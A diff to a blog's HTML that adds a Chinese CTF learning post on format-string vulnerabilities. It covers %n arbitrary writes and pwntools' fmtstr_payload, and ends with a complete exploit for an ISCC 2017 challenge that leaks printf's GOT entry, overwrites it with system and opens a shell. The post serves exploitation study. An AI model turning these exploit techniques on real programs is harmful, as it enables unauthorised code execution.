@@ -252,6 +252,215 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/20/pwn学习（5）格式化字符串漏洞2/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Asa9ao">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Asa9ao">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/11/20/pwn学习（5）格式化字符串漏洞2/" itemprop="url">pwn学习（5）格式化字符串漏洞2</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-20T19:36:28+08:00">
+                2018-11-20
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>昨天看了看格式化字符串漏洞的一些基本内容，今天一方面补全了一下知识，另一方面也做了个题目来练手。</p>
+<h2 id="覆盖任意地址"><a href="#覆盖任意地址" class="headerlink" title="覆盖任意地址"></a>覆盖任意地址</h2><p>首先来看看昨天没有搞完的覆盖内存，昨天我们成功覆盖了栈上的内存改变了局部变量c的值，让程序执行到了我们想要的结果，那程序中还有两个变量a、b（a、b为初始化的全局变量，存储在data段，并不在栈上，详情请看上一篇），能不能将他们的值也改变呢？</p>
+<p>当然可以了，这就是我们内存覆盖的第二个方面—任意地址内存覆盖</p>
+<h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3><p>我们分析程序认识到，我要想输出想要的结果，我们需要把a的值设置为2，b的值设置为0x12345678，那么问题就来了，我们上一次提到的%n是将“打印的个数”写入某个地址，一般的格式是</p>
+<pre><code>addr + %n$n 
+</code></pre><p>而addr作为一个地址长度已经是4了，难道说我们覆盖的最小值只能是4？那当然不是了，我们可以构造下面形式的payload：</p>
+<pre><code>aa%k$nxx + addr
+</code></pre><p>是不是和刚才的有些不一样？这有什么玄机呢？其实很简单，我们之前构造payload时，是找到了我们输入的第一个四个字节所在的栈上的位置进而写入，那么我们也完全可以找到我们输入的第二个四个字节所在的位置（这个位置一想就知道了，就是我们之前找的那个偏移再+1）写入，以此类推。</p>
+<p>上面的字符串其实首先拿aa作为填充字符，和%k凑了四个字节，然后拿$n和xx凑了四个字节，最后的是addr，那addr在栈上的位置也就是原来的偏移6  + 2 也就是8，所以我们的k就是8。万事具备，那我们就上脚本了：</p>
+<pre><code>p = process(&apos;./overwrite.dms&apos;)
+a_addr = 0x804A024
+payload = &apos;aa%8$naa&apos; + p32(a_addr)
+p.sendline(payload)
+print p.recv()
+p.interactive()
+</code></pre><h3 id="覆盖大数字"><a href="#覆盖大数字" class="headerlink" title="覆盖大数字"></a>覆盖大数字</h3><p>具体原理就不再博客上放了（我也没信心说明白，可以参考ctf wiki，毕竟咱们不能做脚本小子），给一个pwntools给出的函数来一步实现</p>
+<pre><code>payload = fmtstr_payload(offset, {addr:data})
+</code></pre><p>这里的offset也就是咱们求出来的偏移值，addr是你想写入的地址，而data是你想写入的数据。<br>这样我们也可以很轻松的覆盖掉b的值，使程序执行到我们想要的地方，脚本如下</p>
+<pre><code>p = process(&apos;./overwrite.dms&apos;)
+b_addr = 0x804A028
+payload = fmtstr_payload(6, {b_addr:0x12345678})
+p.sendline(payload)
+#print p.recv()
+p.interactive()
+</code></pre><h2 id="自动化寻找偏移值"><a href="#自动化寻找偏移值" class="headerlink" title="自动化寻找偏移值"></a>自动化寻找偏移值</h2><p>Pwntools中同样给出了自动化寻找偏移值的方法，不过还是要在重复一遍，还是要搞明白之前讲的原理，毕竟咱们的目的不是做个脚本小子</p>
+<pre><code>def getoffset(payload):
+    p = process(&quot;./overwrite.dms&quot;)
+    p.sendline(payload)
+    info = p.recv()
+    p.close()
+    return info
+autofmt = FmtStr(getoffset)
+print autofmt.offset
+</code></pre><h2 id="题目实战"><a href="#题目实战" class="headerlink" title="题目实战"></a>题目实战</h2><p>题目是来自iscc2017的第一道pwn题，链接就不放了，很容易找到，还是老规矩，首先拿ida分析一波</p>
+<p><img src="https://ws2.sinaimg.cn/large/006tNbRwly1fxeuemhwz8j30om0g8tb6.jpg" alt=""></p>
+<p>可以看到在我们输入name后有一个很明显的格式化字符串漏洞。而在程序中没有可以供我们利用的/bin/sh字符串和system函数，那我们就要考虑人为的创造他们了。</p>
+<p>/bin/sh字符串好说，因为程序存在输入，我们完全可以直接写进去，但system函数怎么办呢？前面说了利用这个漏洞我们可以实现任意地址的泄漏和写入，那我们可以首先泄漏某个函数的libc地址，然后计算出system的地址写入（因为got表表是可写的）之前的那个函数，这就相当于把之前的函数“变成”了system，拿选谁比较合适呢？当然是printf了，因为printf的参数恰好就是我们输入的字符，那我们把printf代替之后就可以直接执行system(“/bin/sh”)了</p>
+<p>思路有了，上exp！</p>
+<pre><code>from pwn import *
+#context.log_level = &apos;debug&apos;
+
+libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)
+elf = ELF(&quot;./pwn1&quot;)
+got_printf = elf.got[&apos;printf&apos;]
+p = process(&quot;./pwn1&quot;)
+p.recvuntil(&quot;input$&quot;)
+p.sendline(&apos;1&apos;)
+p.recvuntil(&apos;please input your name:\n&apos;)
+payload = p32(got_printf) + &quot;%6$s&quot;
+p.sendline(payload)
+printf_addr_and_xxx = p.recvuntil(&quot;,you&quot;)
+printf_addr = u32(printf_addr_and_xxx[4:8])
+print &quot;printf_addr = &quot; + hex(printf_addr)
+system_addr = printf_addr - (libc.symbols[&apos;printf&apos;] - libc.symbols[&apos;system&apos;])
+print &quot;system_addr = &quot; + hex(system_addr)
+
+p.recvuntil(&quot;input$&quot;)
+p.sendline(&apos;1&apos;)
+p.recvuntil(&apos;please input your name:\n&apos;)
+
+payload2 = fmtstr_payload(6, {got_printf: system_addr})
+p.sendline(payload2)
+
+p.sendline(&apos;1&apos;)
+p.recvuntil(&apos;please input your name:\n&apos;)
+p.sendline(&apos;/bin/sh\0&apos;)
+
+p.interactive()
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/19/pwn学习（4）初识格式化字符串漏洞/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1645,7 +1854,7 @@ p.interactive()
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-count">8</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
